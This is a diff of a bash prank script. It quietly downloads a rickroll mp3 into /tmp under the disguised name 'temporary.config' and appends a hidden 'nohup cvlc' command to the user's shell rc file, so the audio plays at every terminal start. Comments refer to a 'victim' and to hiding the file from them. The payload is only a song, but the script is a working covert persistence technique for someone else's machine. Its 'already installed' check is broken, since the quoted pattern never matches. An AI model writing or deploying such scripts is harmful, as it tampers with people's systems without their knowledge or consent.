@@ -1,37 +1,34 @@
-# The rickroll video link to mp3, modify it if you want because this one is a little big (it may take time to download)
-rickrollVideoLink="https://raw.githubusercontent.com/AinTEAsports/TerminalPrank/main/rickroll_144p.mp3"
+#!/bin/bash
 
-# The output filename, modify it so the victim won't find it, I put it in /tmp so when rebooting, the prank goes away
-outputFilename="/tmp/temporary.config"
-
-# We download the video, '-q' stands for quiet download so there is no output, and '-O' is here for output filename
-wget -q $rickrollVideoLink -O $outputFilename
+audio_link="https://raw.githubusercontent.com/AinTEAsports/TerminalPrank/main/rickroll_144p.mp3"
+output_filename="/tmp/temporary.config"
+shell_configfile=~/.${SHELL##*/}rc
 
 
-# We set up the variable (the config file which is executed to every start of the terminal)
-if [[ $SHELL == '/usr/bin/bash' || $SHELL == '/bin/bash' ]]; then
-	shellConfigfile=~/.bashrc
-elif [[ $SHELL == '/usr/bin/zsh' || $SHELL == '/bin/zsh' ]]; then
-	shellConfigfile=~/.zshrc
-else
-	shellConfigfile=~/.${SHELL##*/}rc
-	
-	if [[ ! -f $shellConfigfile ]]; then
-		echo -n "[!] Shell has not been recognized [!]"
-		echo "Cleaning the screen in 3 seconds..."
-		sleep 3
-		clear
-		exit 1
-	fi;
-fi;
+# Verify if the prank is already in shell config file
+if [[ $(cat $shell_configfile) == "*nohup cvlc*" ]]; then
+	echo -e "[~] Prank already in shell config file, exiting the program..."
+	sleep 1
+	exit 0
+fi
 
 
-# Writing the video filename as variable so we can remove it (easily)
-echo "audioFilelocation="$outputFilename >> $shellConfigfile
+# Verify if the shell config file has been found
+if [[ ! -f $shell_configfile ]]; then
+	echo -e "[/!\] Shell config file has not been found, or it does not exists\n\nClearing the terminal in 2 seconds..."
+	sleep 2
+	exit 1
+fi
 
-# Writing the video execution in shell config file
-echo "nohup cvlc --audio --gain 8 --quiet" $outputFilename "&" >> $shellConfigfile
-echo "clear" >> $shellConfigfile
+
+
+
+# Downloading audio_prank
+curl -s $audio_link > $output_filename
+
+# Putting te prank into shell config file so when the terminal is started,
+# the prank is started too
+echo "nohup cvlc --audio --gain 8 --quiet $output_filename &" >> $shell_configfile
 
 
 echo "[+] Operation finished, clearing the terminal in 2 seconds..."
